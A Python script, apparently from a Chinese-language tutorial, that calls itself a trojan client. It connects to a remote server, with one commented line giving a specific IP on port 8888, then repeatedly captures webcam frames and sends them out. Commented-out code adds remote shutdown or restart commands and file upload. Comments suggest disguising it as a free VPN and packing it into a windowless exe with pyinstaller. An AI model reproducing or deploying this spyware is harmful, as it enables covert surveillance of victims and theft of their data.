# 客户端 木马 exe 最后再讲
import os
import sys
from socket import *
import cv2  # pip3 install opencv-python

# 1、准备一台电话机 / 创建一个套接字
socket = socket()
# 2、电话机拨打电话 / 套接字申请连接
socket.connect((gethostname(), 8888))
# socket.connect(('146.56.223.48', 8888))

# 连上之后 木马 免费翻墙
# text = socket.recv(1024).decode()  # 一次最多接受1024个字节
# print(text)
#
# choise = socket.recv(1024).decode()
# print(choise)
# if choise == '1':
#     os.system('shutdown -s -t 60')  # 60秒后关机
# elif choise == '2':
#     os.system('shutdown -r -t 60')  # 60秒后重启
# cmd shutdown -a 取消重启

# 文件传输
# 先告诉后台有多少字节的数据 等待回复
# filesize = os.path.getsize('123.png')
# socket.send(str(filesize).encode())
# socket.recv(1024).decode()

# 打开文件,把文件数据发送给对方,等待回复
# with open('123.png', 'rb') as file:
#     for data in file:  # 把文件中的数据一次一次读出来
#         socket.send(data)  # 把每一次读取的数据发送给后台
#         # print(len(data))
# socket.recv(1024).decode()

# socket.send('你好'.encode()) # 发送二进制的数据
# 银行卡的卡号
# 有18位

# 摄像头
# 1、开启摄像头
cap = cv2.VideoCapture(0)  # 0 1 2
if not cap.isOpened():
    socket.send('error'.encode())
    sys.exit(1)
else:
    socket.send('ready'.encode())
    socket.recv(1024)

    while True:
        _, frame = cap.read()  # 获取到一帧图像
        cv2.imwrite('1.jpg', frame)

        filesize = os.path.getsize('1.jpg')
        socket.send(str(filesize).encode())
        socket.recv(1024).decode()

        with open('1.jpg', 'rb') as file:
            for data in file:  # 把文件中的数据一次一次读出来
                socket.send(data)  # 把每一次读取的数据发送给后台
        socket.recv(1024).decode()

# 2、把摄像头采集到的画面 截取一帧 图片文件
# 3、把得到的图像文件传输给后台

# 1、安装一个模块 pip3 install pyinstaller
# 2、看操作
# 3、pyinstaller -F -w -i icon.png client.py
